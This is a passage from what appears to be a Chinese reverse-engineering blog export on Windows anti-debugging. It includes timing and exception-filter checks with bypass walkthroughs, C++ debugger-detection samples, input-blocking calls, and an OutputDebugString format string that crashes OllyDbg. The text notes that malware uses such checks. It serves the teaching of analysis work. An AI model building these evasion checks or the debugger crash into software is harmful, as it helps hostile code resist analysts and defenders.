Filter内部判断进程正常运行还是调试运行，并根据判断结果修改EIP值。系统在此过程中自行判断调试与否。这种反调试技术融合了静态与动态方法，下面通过练习示例进一步学习。\n基于Windows10的练习1.使用X32dbg（也可用ollydbg）打开DynAD_SUEF.exe，并在程序入口点设置断点\n\n2.运行进入401030，可以看到程序会调用SetUnhandledExceptionFilter()来注册新的TopLevelExceptionFilter（即图中401000地址处），并把上一个LastExceptionFilter函数保存到ds:[40CB3C]处。然后将exa置0，若401052地址处的指令，程序将尝试向未定义的进程虚拟内存地址（0）写入值，这会引发无效的内存非法访问异常。\n\n3.查看新的TopLevelExceptionFilter函数代码，可以看到该函数首先再次调用SetUnhandledExceptionFilter()来恢复Exception Filter（即ds:[40CB3C]），然后获取pExcept-&gt;ContextRecord-&gt;Eip,并使其加4，而原来的pExcept-&gt;ContextRecord-&gt;Eip保存的是异常发生的地址（由2可知为401052），所以新的pExcept-&gt;ContextRecord-&gt;Eip则为401056。也就是说，返回Exception Filter后，继续从401056地址处执行代码。\n附：用[ebp+]为参数（+8是第一个参数，+C是第二个参数），而根据之前的语法，TopLevelExceptionFilter函数的传入的参数为pExcept（即[ebp+8]&#x3D;pExcept），而pExcept的第二个成员指向pContext(或ContextRecord，即[ecx+4]&#x3D;pContext);而pContext偏移B8处的成员为Eip（即[eax+B8]&#x3D;pContext-&gt;Eip）.\n\n4.根据以上的分析，分别在401000、401052、401056等地址处下断点，根据前面的学习可以知道，正常情况下（非调试运行），当程序在401052处触发异常后，就会进入401000中进行处理，处理完成后，就会回到401056继续运行，但是用X32dbg调试程序后，观察程序执行过程，发现程序并未命中401000、401056这俩断点，且一直在异常处循环，这是因为若SEH未处理或注册的SEH根本不存在，此时会调用执行系统的kernel32!UnhandledExceptionFilter() API，该函数内部会运行系统的最后一个异常处理器，但kernel32!UnhandledExceptionFilter() 内部会调用ntdll!NtQueryInformationProcess(ProcessDebugPort) API（静态反调试技术），以判断是否正在调试进程。若进程正常运行（非调试运行），则运行系统最后的异常处理器；若进程处于调试中，则将异常派送给调试器。所以在调试时，还要绕过ntdll!NtQueryInformationProcess(ProcessDebugPort) API静态反调试以像正常运行那样调试程序。\n\n5.对于Windows10，查找调用ntdll!NtQueryInformationProcess的方式如下：\n①首先运行程序到401030处，然后查找ntdll!NtQueryInformationProcess并设置断点\n\n②然后运行401052处的指令触发异常，然后F9两次（或一次），直到进入ntdll!NtQueryInformationProcess函数内部。\n\n③接着点击运行直到返回（Ctrl+F9），然后返回调用处，查看调用ntdll!NtQueryInformationProcess函数时第二个参数传入的值是否是ProcessDebug（7），此值用于探测调试器，以及所处模块是否为kernelBase。如下面图片：第一张图显示调用ntdll!NtQueryInformationProcess函数时传入的第二个参数为22，所处模块为ntdll，所以还要继续点击运行直到返回直到找到符合条件的；第二张图中调用ntdll!NtQueryInformationProcess函数时传入的第二个参数为7，所处模块为kernelBase，符合条件，然后在push第三个参数（即第二张图中768922E6 push eax处，此处后面需要修改值以绕过反调试）和调用结束返回处（即768922F4 test eax,eax）下断点，并把ntdll!NtQueryInformationProcess函数内部的断点去掉\n\n\n\n④重新运行程序，直到断点停到kernelBase模块调用ntdll!NtQueryInformationProcess进行调试检测时传入第三个参数的指令处（即图中768922E6 push eax处），然后在寄存器窗口中右键eax选择在内存窗口中转到，以便监控并修改调用结束后第三个参数，这个参数用于标识是否处于调试中（为0表示处于非调试状态，为0xFFFFFFFF表示处于调试状态）\n\n⑤继续运行直到停到ntdll!NtQueryInformationProcess调用结束返回处（即768922F4 test eax,eax），可以观察到上一步要监测的第三个参数的值变成了0xFFFFFFFF\n\n⑥此时需要将第三个参数修改为0以绕过反调试检测\n\n⑦修改ntdll!NtQueryInformationProcess调用结束后第三个参数的值，然后继续运行，可以发现即使在调试时，也能正常运行401000、401056处的代码\n\nTiming Check时间间隔测量法测量时间间隔的方法有很多种，常用方法如下：\n123456789101112131.Counter based method(利用CPU的计数器Counter)RDTSCkernel32!QueryPerformanceCounter()/ntdll!NtQueryPerformanceCounter()kernel32!GetTickCount()2.Time based method(利用系统的实际时间)timeGetTime()_ftime()计数器的准确程度由高到低排列如下：RDTSC&gt;NtQueryPerformanceCounter()&gt;GetTickCount()NtQueryPerformanceCounter()与GetTickCount()使用相同的硬件(PerformanceCounter)，但二者准确度不同；RDTSC是CPU内部的计数器，准确度最高\n\nRDTSCRDTSC(Read Time Stamp Counter，读取时间戳计数器)\nx86 CPU中存在一个名为TSC（Time Stamp Counter，时间戳计数器）的64位寄存器。CPU対每个Clock Cycle（时钟周期）计数，然后保存到TSC。RDTSC是一条汇编指令，用来将TSC值读入EDX:EAX寄存器（TSC大小为64位，其高32位被保存至EDX寄存器，低32位被保存至EAX寄存器）。\n基于Windows10的练习1.使用X32dbg（也可用ollydbg）打开DynAD_RDTSC.exe，并在程序入口点设置断点\n\n2.下面是程序利用RDTSC进行反调试的代码流\n123456789101112131415161718192021222324252627282930313233343536373839            .....                                                   ; 第一次执行RDTSC指令——将TSC保存到EDX:EAX(64位)0040101C     rdtsc ; 将结果值放入栈中                                                     0040101E     push edx                                                   0040101F     push eax; 用于消耗时间的循环(实际代码可能很复杂)                                                   00401020     xor eax,eax                                                00401022     mov ecx,3E8                                                00401027     inc eax                                                    00401028     loop dynad_rdtsc.401027      ; 第二次执行RDTSC指令                              0040102A     rdtsc; 在栈中输入第一次求得的TSC                                                      0040102C     pop esi                                                    0040102D     pop edi ; 比较TSC值的高位                                                   0040102E     cmp edx,edi                                                00401030     ja dynad_rdtsc.40103E; 比较TSC值的低位差值; 若比特定值(0xFFFFFF)大，则断定处于调试状态                                      00401032     sub eax,esi                                                00401034     mov dword ptr ss:[ebp-4],eax                               00401037     cmp eax,FFFFFF                                             0040103C     jb dynad_rdtsc.401042; 在比较语句的作用下进入异常触发代码，进程非正常终止                                      0040103E     xor eax,eax                                                00401040     mov dword ptr ds:[eax],eax      ; 异常   ; 忽略比较语句，继续运行                        00401042     popad             .....        \n\n上述代码可以看出，2次RDTSC指令调用之间存在一定的时间间隔，通过计算时间差值(Delta)来判断进程是否处于调试状态。Delta值不固定，一般在0xFFFF~0XFFFFFFFF之间取值。40102A地址间的代码区域中，只要执行1次StepInto（F7）或StepOver（F8）命令，Count的间隔就会大于0xFFFFFFFF。3.破解之法有几种方法可以破解以上反调试技术。\n（1）不使用跟踪命令，直接使用RUN命令越过相关代码。在40102C地址处设置断点后运行。虽然运行速度略慢于正常运行速度，但与代码跟踪相比要快很多。\n（2）操作第二个RDTSC的结果值（EDX:EAX）\n操作第二个RDTSC的结果值，使之与第一个结果值相同，从而顺利通过CMP语句\n（3）操纵条件分支指令（CMP&#x2F;Jcc）\n在调试器中强制修改Flags的值，阻止执行跳转至40103E处。\nCF与ZF全为0时，JA指令执行跳转动作。只要将CF与ZF之一的值修改为1，JA指令即失效。\n\n（4）利用内核模式驱动程序使RDTSC指令失效\n利用内核模式驱动程序可以从根本上使基于RDTSC的动态反调试技术失效（其实，OllydAdvanced PlugIn就采用了该方法）。\n检测系统时钟当进程被调试时，调试器事件处理代码、步过指令等将占用 CPU 循环。如果相邻指令之间所花费的时间如果大大超出常规，就意味着进程很可能是在被调试。有如下两种时钟检测来探测调试器存在的方法：\n\n记录执行一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后，则可以认为存在调试器\n记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理完异常，因为调试器处理异常的速度非常慢。默认情况下，调试器处理异常时需要认为干预，这导致大量延迟。虽然很多调试器允许我们忽略异常，将异常直接返回给程序，但这样操作仍然存在不小的延迟\n\n首先我们可以使用rdtsc指令，它返回至系统重新启动以来的时钟数，并且将其作为一个64位的值存入edx:eax中。恶意代码运行两次rdstc指令，然后比较两次读取之间的差值来判断是否存在调试器。\n另外也可以使用函数QueryPerformanceCounter和GetTickCount。同rdstc指令一样，这两个API函数也可以被用来执行一个反调试的时钟检测。为了获取比较的时间差，调用两次函数查询这个计数器，如果两次调用时间话费时间过于长，则可以认为存在调试器。\nGetTickCount返回从操作系统启动所经过的毫秒数。调用两次此函数，如果返回值的差值相差反常，就说明在调试状态。\nQueryPerformanceCounter和GetTickCount的原理类似，这里以GetTickCount为例说明使用方法：\n123456789101112131415161718void CAntiDebugDlg::OnBnClickedBtnGettickcount()&#123;    // TODO: 在此添加控件通知处理程序代码    DWORD dwTime1 = 0;    DWORD dwTime2 = 0;    dwTime1 = GetTickCount();    GetCurrentProcessId();    GetCurrentProcessId();    GetCurrentProcessId();    dwTime2 = GetTickCount();    if (dwTime2 - dwTime1 &gt; 100)    &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;    else &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;&#125;\n\n","slug":"Windows动态反调试技术（一）","date":"2022-07-09T13:39:34.000Z","categories_index":"","tags_index":"逆向,Windows动态反调试技术","author_index":"0netry"},{"id":"0f5e7a00cb9e0d76fb61aefba4cb6bf5","title":"Windows静态反调试技术（三）","content":"TLS回调函数由于TLS回调函数会先于EP代码执行，可以在回调函数内部使用IsDebuggerPresent()等函数判断调试与否，再决定是否继续运行程序。\nETC借助Win32 API获取系统信息来实现反调试。如：\n（1）检测Ollydbg窗口 &lt;- FindWindow()；\n（2）检测Ollydbg进程 &lt;- CreateToolhelp32Snapshot()；\n（3）检查计算机名称是否为”TEST”、”ANALYSIS”等 &lt;- GetComputerName()；\n（4）检查程序运行路径中是否存在”TEST”、”SAMPLE”等名称 &lt;- GetCommandLine()；\n（5）检测虚拟机是否处于运行状态（查看虚拟机特有的进程名称 &lt;- VMWareService.exe、VMWareTray.exe、VMWareUser.exe）\nFindWindow使用此函数查找目标窗口，如果找到，可以禁用窗口，也可以直接退出程序\n函数声明：\n12345HWND FindWindow(LPCSTR lpClassName,LPCSTR lpWindowName);\n\n参数表：\nlpClassName：指向一个以NULL字符结尾的、用来指定类名的字符串或一个可以确定类名字符串的原子。如果这个参数是一个原子，那么它必须是一个在调用此函数前已经通过GlobalAddAtom函数创建好的全局原子。这个原子（一个16bit的值），必须被放置在lpClassName的低位字节中，lpClassName的高位字节置零。\n如果该参数为null时，将会寻找任何与lpWindowName参数匹配的窗口\nlpWindowName：指向一个以NULL字符结尾的、用来指定窗口名（即窗口标题）的字符串。如果此参数为NULL，则匹配所有窗口名。\n1234567891011void CAntiDebugDlg::OnBnClickedBtnFindwindow()&#123;    HWND Hwnd = NULL;    Hwnd = ::FindWindow(L&quot;OllyDbg&quot;, NULL);    if (Hwnd == NULL) &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;    else &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;&#125;\n\n枚举窗口使用EnumWindow函数枚举窗口，并且为每一窗口调用一次回调函数，在回调函数中可以调用GetWindowText获取窗口的标题。与目标窗口名进行比对，如果比对成功，则说明发现调试器。\n函数声明：\n1234567WINUSERAPIBOOLWINAPIEnumWindows(    _In_ WNDENUMPROC lpEnumFunc,_In_ LPARAM lParam);\n\n参数表：\nlpEnumFunc：回调函数指针。\nlParam：指定一个传递给回调函数的应用程序定义值。\n回调函数原型：\n1BOOL CALLBACK EnumWindowsProc(HWND hwnd,LPARAM lParam);\n\n参数表：\nHwnd：顶层窗口的句柄。\nLparam：应用程序定义的一个值（即EnumWindows中的lParam）。\n1Int GetWindowText(HWND hWnd,LPTSTR lpString,Int nMaxCount);\n\n参数表:\nhWnd：带文本的窗口或控件的句柄。\nIpString：指向接收文本的缓冲区的指针。\nnMaxCount：指定要保存在缓冲区内的字符的最大个数，其中包含NULL字符。如果文本超过界限，它就被截断。\n12345678910111213141516171819202122BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)&#123;    WCHAR wzChar[100] = &#123; 0 &#125;;    CStringW strData = L&quot;OllyDbg&quot;;    if (IsWindowVisible(hwnd)) &#123;        GetWindowText(hwnd, wzChar, 100);        if (wcsstr(wzChar, strData)) &#123;            MessageBoxW(NULL,L&quot;Being Debugged!&quot;,NULL,0);            g_bDebugged = TRUE;            return FALSE;        &#125;    &#125;    return TRUE;&#125;void CAntiDebugDlg::OnBnClickedBtnEnumwindow()&#123;    EnumWindows(EnumWindowsProc, NULL);    if (g_bDebugged == FALSE) &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;&#125;\n\n枚举进程枚举进程列表，查看是否有调试器进程\n函数声明：\n1234HANDLE WINAPI CreateToolhelp32Snapshot(DWORD dwFlags,  DWORD th32ProcessID );\n\n通过获取进程信息为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程建立一个快照。\n参数表：\ndwFlags：用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等\nth32ProcessID: 一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表或获取 当前进程快照时可以设为0\n123456BOOLWINAPIProcess32FirstW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe    );\n\nprocess32First是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后，我们可以利用process32First函数来获得第一个进程的句柄。\n123456BOOLWINAPIProcess32NextW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe    );\n\nProcess32Next是一个进程获取函数，当我们利用函数CreateToolhelp32Snapshot()获得当前运行进程的快照后,我们可以利用Process32Next函数来获得下一个进程的句柄。\n123456789101112131415161718192021222324252627282930313233void CAntiDebugDlg::OnBnClickedBtnEnumprocess()&#123;    // TODO: 在此添加控件通知处理程序代码    HANDLE hwnd = NULL;    PROCESSENTRY32W pe32 = &#123; 0 &#125;;    pe32.dwSize = sizeof(pe32);//如果没有这句，得出的路径不对    WCHAR str[] = L&quot;OLLYDBG&quot;;    CStringW strTemp;    BOOL bOK = FALSE;    hwnd = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);    if (hwnd != INVALID_HANDLE_VALUE) &#123;        bool bMore = Process32FirstW(hwnd, &amp;pe32);        do &#123;            strTemp = pe32.szExeFile;            //统一转换为大写进行比较            strTemp.MakeUpper();            if (wcsstr(strTemp, str)) &#123;                MessageBoxW(L&quot;Being Debugged!&quot;);                bOK = TRUE;                break;            &#125;            else if (wcsstr(pe32.szExeFile, L&quot;WINDBG&quot;)) &#123;                MessageBoxW(L&quot;Being Debugged!&quot;);                bOK = TRUE;                break;            &#125;        &#125; while (Process32NextW(hwnd, &amp;pe32));    &#125;    if (bOK == FALSE) &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;    CloseHandle(hwnd);&#125;\n\n查看父进程是不是Explorer当我们双击运行应用程序的时候，父进程都是Explorer，如果是通过调试器启动的，父进程就不是Explorer。\n通过GetCurrentProcessId()获得当前进程的ID\n通过桌面窗口类和名称获得Explorer进程的ID\n使用Process32First&#x2F;Next()函数枚举进程列表，通过PROCESSENTRY32.th32ParentProcessID 获得的当前进程的父进程ID与Explorer的ID进程比对。如果不一样的很可能被调试器附加\n函数声明：\n1234DWORD GetWindowThreadProcessId(HWND hWnd,LPDWORD lpdwProcessId);\n\n找出某个窗口的创建者（线程或进程），返回创建者的标志符。\n参数说明：\nhWnd：（向函数提供的）被查找窗口的句柄.\nlpdwProcessId：进程号的存放地址（变量地址）\n使用方法：\n1234567891011121314151617181920212223242526272829303132333435void CAntiDebugDlg::OnBnClickedBtnExplorer()&#123;    // TODO: 在此添加控件通知处理程序代码    HANDLE hwnd = NULL;    HANDLE hexplorer = NULL;    PROCESSENTRY32 pe32 = &#123; 0 &#125;;    pe32.dwSize = sizeof(pe32);    CStringW str = L&quot;explorer&quot;;    DWORD ExplorerId = 0;    DWORD SelfId = 0;    DWORD SelfParentId = 0;    SelfId = GetCurrentProcessId();    hexplorer = ::FindWindowW(L&quot;Progman&quot;,NULL);    GetWindowThreadProcessId((HWND)hexplorer, &amp;ExplorerId);    hwnd = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);    if (hwnd != INVALID_HANDLE_VALUE)    &#123;        Process32FirstW(hwnd, &amp;pe32);        do         &#123;            if (SelfId == pe32.th32ProcessID)            &#123;                SelfParentId = pe32.th32ParentProcessID;            &#125;        &#125; while (Process32NextW(hwnd,&amp;pe32));    &#125;    if (ExplorerId == SelfParentId) &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;    else    &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;    CloseHandle(hwnd);&#125;\n\n\n\n查看StartupInfo结构在windows操作系统中，Explorer创建进程的时候会把STARTUPINFO结构中的某些值设为0，非Explorer创建进程的时候会忽略这个结构中的值，所以可以通过查看这个结构中的值是不是为0来判断是否在调试状态。\n函数说明：\n123456789101112131415161718192021222324252627282930313233343536373839404142WINBASEAPIVOIDWINAPIGetStartupInfoW(    _Out_ LPSTARTUPINFOW lpStartupInfo    );    取得进程在启动时被指定的 STARTUPINFO 结构typedef struct _STARTUPINFOW &#123;    DWORD   cb;    LPWSTR  lpReserved;    LPWSTR  lpDesktop;    LPWSTR  lpTitle;    DWORD   dwX;    DWORD   dwY;    DWORD   dwXSize;    DWORD   dwYSize;    DWORD   dwXCountChars;    DWORD   dwYCountChars;    DWORD   dwFillAttribute;    DWORD   dwFlags;    WORD    wShowWindow;    WORD    cbReserved2;    LPBYTE  lpReserved2;    HANDLE  hStdInput;    HANDLE  hStdOutput;    HANDLE  hStdError;&#125; STARTUPINFOW, *LPSTARTUPINFOW;使用方法：void CAntiDebugDlg::OnBnClickedBtnStartupinfor()&#123;    // TODO: 在此添加控件通知处理程序代码    STARTUPINFO info = &#123; 0 &#125;;    GetStartupInfo(&amp;info);    if (info.dwX != 0 || info.dwY != 0 || info.dwXCountChars != 0 || info.dwYCountChars != 0        || info.dwFillAttribute != 0 || info.dwXSize != 0 || info.dwYSize != 0)    &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;    else &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;&#125;\n\n\n\nCheckRemoteDebuggerPresent这个函数同IsDebuggerPresent函数几乎一致，它用来检测本机器中的一个进程是否运行在调试器中。同时，它也检查PEB结构中的IsDebugged属性。他不仅可以探测进程自身是否被调试，同时可以探测系统其他进程是否被调试。这个函数将一个进程句柄作为参数，检查这个句柄对应的进程是否被调试器附加，同时，CheckRemoteDebuggerPresent也可以通过传递自身进程句柄探测自己是否被调试。\n函数声明：\n1234BOOL CheckRemoteDebuggerPresent(HANDLE hProcess,PBOOL pbDebuggerPresent)\n\n此函数用来确定是否有调试器附加到进程。\n参数表：\nhProcess：进程句柄\npbDebuggerPresent：指向一个BOOL的变量，如果进程被调试，此变量被赋值为TRUE。\n使用方法：\n12345678910111213141516171819202122typedef BOOL(WINAPI *CHECK_REMOTE_DEBUGGER_PRESENT)(HANDLE, PBOOL);void CAntiDebugDlg::OnBnClickedBtnCheckremote()&#123;    // TODO: 在此添加控件通知处理程序代码    HANDLE      hProcess;    HINSTANCE   hModule;    BOOL        bDebuggerPresent = FALSE;    CHECK_REMOTE_DEBUGGER_PRESENT CheckRemoteDebuggerPresent;    hModule = GetModuleHandleA(&quot;Kernel32&quot;);    CheckRemoteDebuggerPresent =        (CHECK_REMOTE_DEBUGGER_PRESENT)GetProcAddress(hModule, &quot;CheckRemoteDebuggerPresent&quot;);    hProcess = GetCurrentProcess();    CheckRemoteDebuggerPresent(hProcess, &amp;bDebuggerPresent);    if (bDebuggerPresent == TRUE)    &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;    else    &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;&#125;\n\n\n\nSeDebugPrivilege进程权限默认情况下进程没有 SeDebugPrivilege 权限，调试时，会从调试器继承这个权限，可以通过打开 CSRSS.EXE 进程间接地使用SeDebugPrivilege来判断进程是否被调试。\n使用方法：\n123456789101112131415161718192021222324252627282930void CAntiDebugDlg::OnBnClickedBtnSedebugpre()&#123;    // TODO: 在此添加控件通知处理程序代码    HANDLE hProcessSnap;    HANDLE hProcess;    PROCESSENTRY32 tp32 = &#123; 0 &#125;;  //结构体    tp32.dwSize = sizeof(tp32);    CString str = L&quot;csrss.exe&quot;;    hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);    if (INVALID_HANDLE_VALUE != hProcessSnap)    &#123;        Process32First(hProcessSnap, &amp;tp32);        do &#123;            if (0 == lstrcmpi(str, tp32.szExeFile))            &#123;                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, NULL, tp32.th32ProcessID);                if (NULL != hProcess)                &#123;                    MessageBoxW(L&quot;Being Debugged!&quot;);                &#125;                else                &#123;                    MessageBoxW(L&quot;Not Being Debugged!&quot;);                &#125;                CloseHandle(hProcess);            &#125;        &#125; while (Process32Next(hProcessSnap, &amp;tp32));    &#125;    CloseHandle(hProcessSnap);&#125;\n\n\n\nGuardPages这个检查是针对 OllyDbg 的，因为它和 OllyDbg 的内存访问&#x2F;写入断点特性相关。除了硬件断点和软件断点外， OllyDbg 允许设置一个内存访问&#x2F;写入断点，这种类型的断点是通过页面保护来实现的。简单地说，页面保护提供了当应用程序的某块内存被访问时获得通知这样一个途径。\n页面保护是通过 PAGE_GUARD 页面保护修改符来设置的，如果访问的内存地址是受保护页面的一部分，将会产生一个 STATUS_GUARD_PAGE_VIOLATION(0x80000001)异常。如果进程被 OllyDbg 调试并且受保护的页面被访问，将不会抛出异常，访问将会被当作内存断点\n使用方法：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455static bool isDebugged = 1;LONG WINAPI TopUnhandledExceptionFilter2(    struct _EXCEPTION_POINTERS *ExceptionInfo)&#123;    _asm pushad        lpSetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)lpOldHandler);    ExceptionInfo-&gt;ContextRecord-&gt;Eip = NewEip;    isDebugged = 0;    _asm popad    return EXCEPTION_CONTINUE_EXECUTION;&#125;void CAntiDebugDlg::OnBnClickedBtnGuidpages()&#123;    // TODO: 在此添加控件通知处理程序代码    ULONG dwOldType;    DWORD dwPageSize;    LPVOID lpvBase;               // 获取内存的基地址    SYSTEM_INFO sSysInfo;         // 系统信息    GetSystemInfo(&amp;sSysInfo);     // 获取系统信息    dwPageSize = sSysInfo.dwPageSize;       //系统内存页大小    lpSetUnhandledExceptionFilter = (pSetUnhandledExceptionFilter)GetProcAddress(LoadLibrary(L&quot;kernel32.dll&quot;),        &quot;SetUnhandledExceptionFilter&quot;);    lpOldHandler = (DWORD)lpSetUnhandledExceptionFilter(TopUnhandledExceptionFilter2);    // 分配内存    lpvBase = VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);    if (lpvBase == NULL)            MessageBoxW(L&quot;VirtualAlloc Error&quot;);    _asm &#123;        mov   NewEip, offset safe //方式二，更简单        mov   eax, lpvBase        push  eax        mov   byte ptr[eax], 0C3H //写一个 RETN 到保留内存，以便下面的调用    &#125;    if (0 == ::VirtualProtect(lpvBase, dwPageSize, PAGE_EXECUTE_READ | PAGE_GUARD, &amp;dwOldType)) &#123;        MessageBoxW(L&quot;VirtualProtect Error&quot;);    &#125;    _asm &#123;        pop   ecx        call  ecx   //调用时压栈        safe :        pop   ecx    //堆栈平衡，弹出调用时的压栈    &#125;    if (1 == isDebugged) &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;    else &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;    VirtualFree(lpvBase, dwPageSize, MEM_DECOMMIT);&#125;\n\n硬件断点硬件断点是通过设置名为 Dr0 到 Dr7 的调试寄存器来实现的。 Dr0-Dr3 包含至多 4 个断点的地址， Dr6 是个标志，它指示哪个断点被触发了， Dr7 包含了控制 4 个硬件断点诸如启用&#x2F;禁用或者中断于读&#x2F;写的标志。\n由于调试寄存器无法在 Ring3 下访问，硬件断点的检测需要执行一小段代码。可以利用含有调试寄存器值的 CONTEXT 结构，该结构可以通过传递给异常处理例程的 ContextRecord 参数来访问。\n使用方法：\n12345678910111213141516171819202122232425262728293031323334353637383940static bool isDebuggedHBP = 0;LONG WINAPI TopUnhandledExceptionFilterHBP(    struct _EXCEPTION_POINTERS *ExceptionInfo)&#123;    _asm pushad    //AfxMessageBox(&quot;回调函数被调用&quot;);    ExceptionInfo-&gt;ContextRecord-&gt;Eip = NewEip;    if (0 != ExceptionInfo-&gt;ContextRecord-&gt;Dr0 || 0 != ExceptionInfo-&gt;ContextRecord-&gt;Dr1 ||        0 != ExceptionInfo-&gt;ContextRecord-&gt;Dr2 || 0 != ExceptionInfo-&gt;ContextRecord-&gt;Dr3)        isDebuggedHBP = 1;  //检测有无硬件断点    ExceptionInfo-&gt;ContextRecord-&gt;Dr0 = 0; //禁用硬件断点，置0    ExceptionInfo-&gt;ContextRecord-&gt;Dr1 = 0;    ExceptionInfo-&gt;ContextRecord-&gt;Dr2 = 0;    ExceptionInfo-&gt;ContextRecord-&gt;Dr3 = 0;    ExceptionInfo-&gt;ContextRecord-&gt;Dr6 = 0;    ExceptionInfo-&gt;ContextRecord-&gt;Dr7 = 0;    ExceptionInfo-&gt;ContextRecord-&gt;Eip = NewEip; //转移到安全位置    _asm popad    return EXCEPTION_CONTINUE_EXECUTION;&#125;void CAntiDebugDlg::OnBnClickedBtnHdbreakpoint()&#123;    // TODO: 在此添加控件通知处理程序代码    lpSetUnhandledExceptionFilter = (pSetUnhandledExceptionFilter)GetProcAddress(LoadLibrary(L&quot;kernel32.dll&quot;),        &quot;SetUnhandledExceptionFilter&quot;);    lpOldHandler = (DWORD)lpSetUnhandledExceptionFilter(TopUnhandledExceptionFilterHBP);    _asm &#123;        mov   NewEip, offset safe //方式二，更简单        int   3        mov   isDebuggedHBP, 1 //调试时可能也不会触发异常去检测硬件断点        safe:    &#125;    if (1 == isDebuggedHBP) &#123;        MessageBoxW(L&quot;Being Debugged!&quot;);    &#125;    else &#123;        MessageBoxW(L&quot;Not Being Debugged!&quot;);    &#125;&#125;\n\n封锁键盘，鼠标输入12345WINUSERAPIBOOLWINAPIBlockInput(    BOOL fBlockIt);\n\nBlockInput函数阻塞键盘及鼠标事件到达应用程序。该参数指明函数的目的。如果参数为TRUE，则鼠标和键盘事件将被阻塞。如果参数为FALSE， 则鼠标和键盘事件不被阻塞。\n可以在代码中的关键位置调用此函数。\n使用方法：\n1234567891011void CAntiDebugDlg::OnBnClickedBtnBlockinput()&#123;    // TODO: 在此添加控件通知处理程序代码    DWORD dwNoUse;    DWORD dwNoUse2;    ::BlockInput(TRUE);    dwNoUse = 2;    dwNoUse2 = 3;    dwNoUse = dwNoUse2;    ::BlockInput(FALSE);&#125;\n\n禁用窗口与BlockInput函数的功能类似，用来禁用窗口\n函数说明：\nBOOL EnableWindow（HWND hWnd，BOOL bEnable）\nhWnd：被允许&#x2F;禁止的窗口句柄\nbEnable: 定义窗口是被允许，还是被禁止。若该参数为TRUE，则窗口被允许。若该参数为FALSE，则窗口被禁止。\nWindows API函数。该函数允许&#x2F;禁止指定的窗口或控件接受鼠标和键盘的输入，当输入被禁止时，窗口不响应鼠标和按键的输入，输入允许时，窗口接受所有的输入。\n使用方法：\n12345678910111213void CAntiDebugDlg::OnBnClickedBtnEnbalewindow()&#123;    // TODO: 在此添加控件通知处理程序代码    CWnd *wnd;    wnd = GetForegroundWindow();    wnd-&gt;EnableWindow(FALSE);    DWORD dwNoUse;    DWORD dwNoUse2;    dwNoUse = 2;    dwNoUse2 = 3;    dwNoUse = dwNoUse2;    wnd-&gt;EnableWindow(TRUE);&#125;\n\nOutputDebugStringOutputDebugString 函数用于向调试器发送一个格式化的字符串， Ollydbg 会在底端显示相应的信息。 OllyDbg 存在格式化字符串溢出漏洞，非常严重，轻则崩溃，重则执行任意代码。这个漏洞是由于 Ollydbg 对传递给 kernel32!OutputDebugString()的字符串参数过滤不严导致的，它只对参数进行那个长度检查，只接受 255 个字节，但没对参数进行检查，所以导致缓冲区溢出。\n使用方法\n123456//能够让OD崩溃void CAntiDebugDlg::OnBnClickedBtnOutputdebugstring()&#123;    // TODO: 在此添加控件通知处理程序代码    ::OutputDebugString(L&quot;%s%s%s&quot;);&#125;\n\n","slug":"Windows静态反调试技术（三）","date":"2022-06-25T13:18:17.000Z","categories_index":"","tags_index":"逆向,Windows静态反调试技术","author_index":"0netry"},{"id":"4d2341767a6c86040d957eae87d1ec51","title":"Windows静态反调试技术（二）","content":"NtQueryInformationProcess()NtQueryInformationProcess定义通过NtQueryInformationProcess() API可以获取各种与进程调试相关的信息，该函数定义如下：\n1234567NTSTATUS WINAPI NtQueryInformationProcess(\t__in HANDLE ProcessHandle,\t__in PROCESSINFOCLASS ProcessInformationClass,\t__out PVOID ProcessInformation,\t__in ULONG ProcessInformationLength,\t__out_opt PULONG ReturnLength);\n\n为NtQueryInformationProcess()函数的第二个参数PROCESSINFOCLASS ProcessInformationClass指定特定的值并调用该函数，相关信息就会被设置到其第三个参数PVOID ProcessInformation。PROCESSINFOCLASS是枚举类型，拥有的值如下所示：\n123456789101112131415161718192021222324252627282930enum PROCESSINFOCLASS&#123;\tProcessBasicInformation=0,\tProcessQuotaLimits,\tProcessIoCounters,\tProcessVmCounters,\tProcessTimes,\tProcessBasePriority,\tProcessRaisePriority,\tProcessDebugPort=7,        